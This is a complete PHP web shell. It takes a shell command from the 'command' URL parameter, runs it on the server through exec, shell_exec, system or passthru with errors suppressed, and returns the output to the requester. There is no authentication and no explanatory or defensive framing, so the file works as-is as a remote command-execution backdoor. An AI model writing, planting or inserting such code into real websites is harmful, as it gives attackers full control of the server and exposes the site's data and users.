<?php
function execute($cfe) {
	$res = '';
	
	if(function_exists('exec')) {
		@exec($cfe,$res);
		$res = join("\n",$res);
	} elseif(function_exists('shell_exec')) {
		$res = @shell_exec($cfe);
	} elseif(function_exists('system')) {
		@ob_start();
		@system($cfe);
		$res = @ob_get_contents();
		@ob_end_clean();
	} elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cfe);
		$res = @ob_get_contents();
		@ob_end_clean();
	} 
	
	return $res;
}

$command = $_GET['command'];
echo(execute($command));

exit;
?>